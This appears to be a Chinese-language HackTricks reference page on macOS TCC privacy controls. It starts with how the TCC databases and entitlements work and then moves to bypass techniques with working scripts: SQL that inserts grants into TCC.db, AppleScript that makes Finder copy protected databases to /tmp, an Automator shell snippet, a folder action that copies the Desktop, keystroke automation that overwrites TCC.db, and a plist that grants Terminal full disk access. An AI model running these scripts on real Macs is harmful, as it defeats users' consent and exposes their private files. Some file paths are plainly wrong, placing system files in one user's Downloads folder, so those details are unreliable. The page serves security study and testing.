# macOS TCC

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## **基本信息**

**TCC（透明度、同意和控制）**是一种安全协议，专注于规范应用程序权限。其主要作用是保护诸如**位置服务、联系人、照片、麦克风、摄像头、辅助功能和完全磁盘访问**等敏感功能。通过在授予应用程序对这些元素访问之前强制要求明确用户同意，TCC增强了隐私和用户对其数据的控制。

用户在应用程序请求访问受保护功能时会遇到TCC。这通过一个提示可见，允许用户**批准或拒绝访问**。此外，TCC支持直接用户操作，例如**将文件拖放到应用程序中**，以授予对特定文件的访问权限，确保应用程序仅能访问明确允许的内容。

![TCC提示的示例](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC**由位于`/System/Library/PrivateFrameworks/TCC.framework/Support/tccd`的**守护程序**处理，并在`/System/Library/LaunchDaemons/com.apple.tccd.system.plist`中进行配置（注册mach服务`com.apple.tccd.system`）。

每个已登录用户定义的**用户模式tccd**在`/System/Library/LaunchAgents/com.apple.tccd.plist`中运行，注册mach服务`com.apple.tccd`和`com.apple.usernotifications.delegate.com.apple.tccd`。

在这里，您可以看到作为系统和用户运行的tccd：
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
权限是从父应用程序继承的，权限是基于Bundle ID和Developer ID进行跟踪。

### TCC数据库

然后将允许/拒绝存储在一些TCC数据库中：

- 系统范围的数据库位于 **`/Library/Application Support/com.apple.TCC/TCC.db`**。
- 此数据库受到 SIP 保护，因此只有 SIP 绕过才能写入其中。
- 用户TCC数据库 **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** 用于每个用户的偏好设置。
- 此数据库受保护，因此只有具有高TCC权限的进程（如完全磁盘访问）才能写入其中（但不受 SIP 保护）。

{% hint style="warning" %}
先前的数据库也受到 **TCC 保护以进行读取访问**。因此，除非是来自具有TCC特权进程的情况，否则您将无法读取常规用户TCC数据库。

但是，请记住，具有这些高权限的进程（如 **FDA** 或 **`kTCCServiceEndpointSecurityClient`**）将能够写入用户的TCC数据库。
{% endhint %}

- 还有一个 **第三个** TCC 数据库位于 **`/var/db/locationd/clients.plist`**，用于指示允许访问位置服务的客户端。
- 受 SIP 保护的文件 **`/Users/carlospolop/Downloads/REG.db`**（也受到 TCC 的读取访问保护），包含所有有效TCC数据库的位置。
- 受 SIP 保护的文件 **`/Users/carlospolop/Downloads/MDMOverrides.plist`**（也受到 TCC 的读取访问保护），包含更多TCC授予的权限。
- 受 SIP 保护的文件 **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`**（但任何人都可以读取）是需要TCC异常的应用程序的允许列表。

{% hint style="success" %}
iOS 中的TCC数据库位于 **`/private/var/mobile/Library/TCC/TCC.db`**
{% endhint %}

{% hint style="info" %}
**通知中心 UI** 可以在系统TCC数据库中进行更改：

{% code overflow="wrap" %}
```bash
codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
[..]
com.apple.private.tcc.manager
com.apple.rootless.storage.TCC
```
{% endcode %}

然而，用户可以使用**`tccutil`**命令行实用程序**删除或查询规则**。
{% endhint %}

#### 查询数据库

{% tabs %}
{% tab title="用户数据库" %}
{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}

{% tab title="系统数据库" %}
{% code overflow="wrap" %}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% hint style="success" %}
检查这两个数据库，您可以检查应用程序已允许、已禁止或未拥有的权限（它会请求权限）。
{% endhint %}

* **`service`** 是 TCC 权限的字符串表示
* **`client`** 是具有权限的 Bundle ID 或二进制文件路径
* **`client_type`** 指示它是 Bundle 标识符（0）还是绝对路径（1）

<details>

<summary>如果是绝对路径如何执行</summary>

只需执行 **`launctl load you_bin.plist`**，使用类似以下的 plist 文件：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
</details>

* **`auth_value`** 可以有不同的值: denied(0), unknown(1), allowed(2), 或 limited(3)。
* **`auth_reason`** 可以采用以下值: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
* **csreq** 字段用于指示如何验证要执行的二进制文件并授予 TCC 权限:
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
* 要了解表格的**其他字段**的更多信息，请查看[**此博客文章**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)。

您还可以在`系统偏好设置 --> 安全性与隐私 --> 隐私 --> 文件和文件夹`中查看**已授予的权限**给应用程序。

{% hint style="success" %}
用户可以使用**`tccutil`** **删除或查询规则**。
{% endhint %}

#### 重置 TCC 权限
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### TCC 签名检查

TCC **数据库** 存储了应用程序的 **Bundle ID**，但它还存储了有关签名的 **信息**，以确保请求使用权限的应用程序是正确的应用程序。
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
{% endcode %}

{% hint style="warning" %}
因此，使用相同名称和捆绑标识的其他应用程序将无法访问授予其他应用程序的权限。
{% endhint %}

### 权限和TCC权限

应用程序不仅需要请求并获得对某些资源的访问权限，还需要具有相关的权限。\
例如，Telegram具有权限`com.apple.security.device.camera`来请求访问摄像头。没有此权限的应用程序将无法访问摄像头（用户甚至不会被询问权限）。

但是，要访问某些用户文件夹，例如`~/Desktop`、`~/Downloads`和`~/Documents`，它们不需要具有任何特定的权限。系统将透明地处理访问并根据需要提示用户。

苹果的应用程序不会生成提示。它们在其权限列表中包含预授予权利，这意味着它们永远不会生成弹出窗口，也不会出现在任何TCC数据库中。例如：
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
这将避免日历请求用户访问提醒事项、日历和通讯簿。

{% hint style="success" %}
除了一些关于授权的官方文档之外，还可以在[https://newosxbook.com/ent.jl](https://newosxbook.com/ent.jl)找到一些非官方**有关授权的有趣信息**。
{% endhint %}

一些TCC权限包括：kTCCServiceAppleEvents、kTCCServiceCalendar、kTCCServicePhotos... 没有公开的列表定义了所有这些权限，但你可以查看这个[**已知权限列表**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service)。

### 敏感且无保护的位置

* $HOME（本身）
* $HOME/.ssh、$HOME/.aws 等
* /tmp

### 用户意图 / com.apple.macl

如前所述，可以通过将文件拖放到应用程序中来**授予应用程序对文件的访问权限**。这种访问权限不会在任何TCC数据库中指定，而是作为文件的**扩展属性**。该属性将**存储允许应用程序的 UUID**：
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
{% hint style="info" %}
有趣的是 **`com.apple.macl`** 属性由 **Sandbox** 管理，而不是 tccd。

另请注意，如果您将允许计算机上应用程序的 UUID 的文件移动到不同的计算机，因为相同的应用程序将具有不同的 UID，它不会授予该应用程序访问权限。
{% endhint %}

扩展属性 `com.apple.macl` **无法像其他扩展属性一样清除**，因为它受到 **SIP 保护**。然而，正如[**在这篇文章中解释的**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)，可以通过**压缩**文件，**删除**它，然后**解压**来禁用它。

## TCC权限提升和绕过

### 插入到TCC

如果您在某个时刻成功获得对 TCC 数据库的写访问权限，可以使用类似以下内容来添加条目（删除注释）：

<details>

<summary>插入到TCC示例</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### TCC Payloads

如果您成功进入一个带有某些TCC权限的应用程序，请查看以下页面，其中包含可滥用这些权限的TCC有效载荷：

{% content-ref url="macos-tcc-payloads.md" %}
[macos-tcc-payloads.md](macos-tcc-payloads.md)
{% endcontent-ref %}

### Apple 事件

了解有关 Apple 事件的信息：

{% content-ref url="macos-apple-events.md" %}
[macos-apple-events.md](macos-apple-events.md)
{% endcontent-ref %}

### 自动化（Finder）到 FDA\*

自动化权限的TCC名称是：**`kTCCServiceAppleEvents`**\
此特定的TCC权限还指示了可以在TCC数据库中管理的**应用程序**（因此权限不允许仅管理所有内容）。

**Finder** 是一个**始终具有 FDA** 的应用程序（即使在 UI 中看不到），因此如果您对其具有**自动化**权限，您可以滥用其权限**执行一些操作**。\
在这种情况下，您的应用程序需要对 **`com.apple.Finder`** 具有 **`kTCCServiceAppleEvents`** 权限。

{% tabs %}
{% tab title="窃取用户的 TCC.db" %}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{% endtab %}

{% tab title="窃取系统 TCC.db" %}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{% endtab %}
{% endtabs %}

您可以滥用这个漏洞来**编写自己的用户 TCC 数据库**。

{% hint style="warning" %}
有了这个权限，您将能够**要求 Finder 访问 TCC 受限文件夹**并提供文件，但据我所知，您**无法让 Finder 执行任意代码**来充分滥用他的 FDA 访问权限。

因此，您将无法滥用完整的 FDA 能力。
{% endhint %}

这是获取 Finder 上的自动化权限的 TCC 提示：

<figure><img src="../../../../.gitbook/assets/image (24).png" alt="" width="244"><figcaption></figcaption></figure>

{% hint style="danger" %}
请注意，因为**Automator** 应用程序具有 TCC 权限 **`kTCCServiceAppleEvents`**，它可以**控制任何应用程序**，比如 Finder。因此，拥有控制 Automator 的权限，您也可以使用以下代码控制**Finder**：
{% endhint %}

<details>

<summary>在 Automator 中获取一个 shell</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

同样适用于**脚本编辑器应用程序**，它可以控制Finder，但是使用AppleScript，你无法强制其执行脚本。

### 自动化（SE）到一些TCC

**系统事件可以创建文件夹操作，文件夹操作可以访问一些TCC文件夹**（桌面、文稿和下载），因此可以使用以下脚本来滥用这种行为：
```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
-- Ensure Folder Actions are enabled
set folder actions enabled to true

-- Define the path to the folder and the script
set homeFolder to path to home folder as text
set folderPath to homeFolder & "Desktop"
set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

-- Create or get the Folder Action for the Desktop
if not (exists folder action folderPath) then
make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
end if
set myFolderAction to folder action folderPath

-- Attach the script to the Folder Action
if not (exists script scriptPath of myFolderAction) then
make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
end if

-- Enable the Folder Action and the script
enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```
### 自动化（SE）+ 辅助功能（**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**）到 FDA\*

在 **`System Events`** 上的自动化 + 辅助功能（**`kTCCServicePostEvent`**）允许发送**按键到进程**。这样，您可以滥用 Finder 来更改用户的 TCC.db 或为任意应用程序提供 FDA（尽管可能需要提示输入密码）。

Finder 覆盖用户 TCC.db 的示例：
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### 将 `kTCCServiceAccessibility` 提升至 FDA\*

查看此页面以获取一些[**滥用辅助功能权限的有效载荷**](macos-tcc-payloads.md#accessibility)来提升至 FDA\* 或例如运行键盘记录器。

### **将 Endpoint Security Client 提升至 FDA**

如果你拥有 **`kTCCServiceEndpointSecurityClient`**，你就拥有 FDA。结束。

### 将 System Policy SysAdmin File 提升至 FDA

**`kTCCServiceSystemPolicySysAdminFiles`** 允许**更改**用户的 **`NFSHomeDirectory`** 属性，从而更改用户的主文件夹，因此可以**绕过 TCC**。

### 将 User TCC DB 提升至 FDA

获得对**用户 TCC**数据库的**写入权限**，你无法授予自己 **`FDA`** 权限，只有存储在系统数据库中的权限可以授予。

但是你可以给自己**`对 Finder 的自动化权限`**，并滥用先前的技术来提升至 FDA\*。

### **FDA 到 TCC 权限**

**全磁盘访问**在 TCC 中的名称是 **`kTCCServiceSystemPolicyAllFiles`**

我不认为这是一个真正的权限提升，但以防万一你觉得有用：如果你控制了一个拥有 FDA 权限的程序，你可以**修改用户的 TCC 数据库并授予自己任何访问权限**。这可以作为一种持久性技术，在你可能失去 FDA 权限时使用。

### **SIP 绕过至 TCC 绕过**

系统的 **TCC 数据库** 受 **SIP** 保护，因此只有具有指定赋权的进程才能修改它。因此，如果攻击者找到了一个 **SIP 绕过**（能够修改受 SIP 限制的文件），他将能够：

* **移除 TCC 数据库的保护**，并赋予自己所有 TCC 权限。他可以滥用其中的任何文件，例如：
  * TCC 系统数据库
  * REG.db
  * MDMOverrides.plist

然而，还有另一种选择来滥用这个 **SIP 绕过以绕过 TCC**，文件 `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` 是一个需要 TCC 例外的应用程序允许列表。因此，如果攻击者可以**移除此文件的 SIP 保护**并添加自己的**应用程序**，该应用程序将能够绕过 TCC。\
例如，要添加终端：
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
### AllowApplicationsList.plist:

### 允许应用程序列表.plist：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### TCC绕过

{% content-ref url="macos-tcc-bypasses/" %}
[macos-tcc-bypasses](macos-tcc-bypasses/)
{% endcontent-ref %}

## 参考资料

* [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
* [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
* [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

支持HackTricks的其他方式：

* 如果您想在HackTricks中看到您的**公司广告**或**下载PDF版本的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
